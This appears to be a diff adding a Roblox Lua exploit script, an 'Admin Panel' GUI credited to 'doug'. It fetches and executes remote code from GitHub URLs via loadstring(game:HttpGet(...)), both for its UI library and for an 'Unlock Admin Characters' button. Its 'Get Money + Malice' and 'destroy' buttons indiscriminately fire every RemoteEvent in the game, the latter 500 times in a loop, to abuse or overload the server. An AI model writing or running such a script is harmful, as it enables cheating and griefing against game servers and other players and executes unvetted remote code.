@@ -1,0 +1,49 @@
+local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
+
+local win = DiscordLib:Window("Admin Panel")
+
+local serv = win:Server("Admin Main", "")
+
+local btns = serv:Channel("Main")
+
+btns:Button("Get Money + Malice", function()
+
+for i,v in pairs(game:GetDescendants()) do 
+  pcall(function()  
+    if v:IsA("RemoteEvent") then
+      v:FireServer()
+    end
+  end)
+end
+
+end)
+
+btns:Seperator()
+
+btns:Button("Unlock Admin Characters", function()
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/charlieomg/forsaken-clone-stuff/refs/heads/main/get%20admin%20stuff.txt")()
+
+end)
+
+btns:Seperator()
+
+btns:Button("destroy", function()
+
+for count = 1,500,1 do
+  for i,v in pairs(game:GetDescendants()) do 
+    pcall(function()
+      if v:IsA("RemoteEvent") then
+        v:FireServer()
+      end --forgot this
+    end) --forgot this
+  end --forgot this
+wait()
+end
+
+end)
+
+serv:Channel("by doug")
+
+
+win:Server("Main", "http://www.roblox.com/asset/?id=6031075938")
